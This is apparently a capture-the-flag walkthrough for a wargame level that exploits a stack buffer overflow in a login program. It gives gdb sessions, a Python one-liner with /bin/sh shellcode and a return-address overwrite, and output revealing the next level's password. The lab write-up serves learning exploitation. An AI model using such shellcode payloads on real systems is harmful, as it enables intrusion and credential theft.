
# Walkthrough

**Main** : 
After analyse this program there is  a vulnerability due to a buffer overflow.
The  array is defined with a size of 256 characters,  but there are 7 bytes which are used so we will exploit the remains of free space to do a shell code injection



**Process to exploit the buffer overflow:**
>   1. Find the offset
>   2. Create exploit code  
>   3. Exploit buffe overflow

## Step 1

###  Find the offset
To determine the offset at which the program overwrites the return address on the stack I can do this by providing a unique pattern as input and then analyzing the program's behavior using GDB as debugger  by crashing it. 
Tools like gdb and [Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)

```
(gdb) r
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? () --->  it mean the offset is 80
(gdb) 

```

0x37634136 = 80,  it mean the offset is 80

## Step 2 
### Create exploit code  
There firstly find the address of the buffer  to exploit
```
(gdb) disassemble main
Dump of assembler code for function main:
   0x080484d0 <+0>:	push   %ebp
   0x080484d1 <+1>:	mov    %esp,%ebp
   0x080484d3 <+3>:	push   %edi
   0x080484d4 <+4>:	push   %ebx
   0x080484d5 <+5>:	and    $0xfffffff0,%esp
   0x080484d8 <+8>:	sub    $0x60,%esp
   0x080484db <+11>:	lea    0x1c(%esp),%ebx
   0x080484df <+15>:	mov    $0x0,%eax
   0x080484e4 <+20>:	mov    $0x10,%edx
   0x080484e9 <+25>:	mov    %ebx,%edi
   0x080484eb <+27>:	mov    %edx,%ecx
   0x080484ed <+29>:	rep stos %eax,%es:(%edi)
   0x080484ef <+31>:	movl   $0x0,0x5c(%esp)
   0x080484f7 <+39>:	movl   $0x80486b8,(%esp)
   0x080484fe <+46>:	call   0x8048380 <puts@plt>
   0x08048503 <+51>:	mov    $0x80486df,%eax
   0x08048508 <+56>:	mov    %eax,(%esp)
   0x0804850b <+59>:	call   0x8048360 <printf@plt>
   0x08048510 <+64>:	mov    0x804a020,%eax
   0x08048515 <+69>:	mov    %eax,0x8(%esp)
   0x08048519 <+73>:	movl   $0x100,0x4(%esp)

>    0x08048521 <+81>:	movl   $0x804a040,(%esp)

   0x08048528 <+88>:	call   0x8048370 <fgets@plt>
   0x0804852d <+93>:	call   0x8048464 <verify_user_name>

```
**Analyse address**  *0x804a040*
After examine the address, we discovery it is address of buffer so we going to exploit it to run the shell code

```
(gdb) x 0x0804a040
0x804a040 <a_user_name>:	0x00000000 ---> It the begin address ofthe buffer

```
we just have to add 7 to account for the username string character and we will have the address to put  the  shellcode.

**Payload**
```
python -c "print 'dat_wil' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac' + '\x08\x04\xa0\x47'[::-1]" > /tmp/payload
```
## Step 3

### Exploit buffer overflow

```
cat /tmp/payload - | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv

```
